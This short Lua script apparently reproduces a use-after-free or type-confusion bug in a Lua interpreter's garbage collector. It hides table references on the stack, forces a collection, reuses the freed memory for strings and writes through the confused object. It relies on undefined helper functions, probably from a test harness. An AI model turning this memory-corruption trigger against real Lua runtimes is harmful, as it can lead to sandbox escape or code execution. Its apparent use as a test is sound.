
function HideTable()
  local t = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 
              1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  local s00 = t
  local s01 = t
  local s02 = t
  local s03 = t
  local s04 = t
  local s05 = t
  local s06 = t
  local s07 = t
  local s08 = t
  local s09 = t
  local s0a = t
  local s0b = t
  local s0c = t
  local s0d = t
  local s0e = t
  local s0f = t
  local s10 = t
  local s11 = t
  local s12 = t
  local s13 = t
  local s14 = t
  local s15 = t
  local s16 = t
  local s17 = t
  local s18 = t
  local s19 = t
  local s1a = t
  local s1b = t
  local s1c = t
  local s1d = t
  local s1e = t
  local s1f = t
end

function OverwriteTableArray(store)
  local i = 0
  while i < #store do
    store[i+1] = NewString('%s')
    i = i + 1
  end
end

local s = {1,2,3,4,5,6,7,8}

GrowStack(0, HideTable)
TriggerGC(10)
OverwriteTableArray(s)

local i = 0
local table = RetrieveString1()

while i < 21 do
  local t = table[5 + i]
  t[1] = 0
  i = i + 1
end
